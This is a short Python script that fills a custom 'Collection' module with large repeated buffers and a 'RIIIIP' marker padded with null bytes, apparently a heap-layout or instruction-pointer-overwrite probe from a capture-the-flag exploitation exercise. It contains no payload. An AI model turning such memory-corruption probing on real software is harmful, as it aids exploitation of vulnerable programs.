import Collection

a = Collection.Collection({"a":["A"*0x1000]*0x46})
print(a.get("a"))
print(a)
print(a.get("a"))
a = Collection.Collection({"a":[("RIIIIP" + "\x00"*2)*0x200]*0x46})
print(a.get("a"))
print(a.get("a"))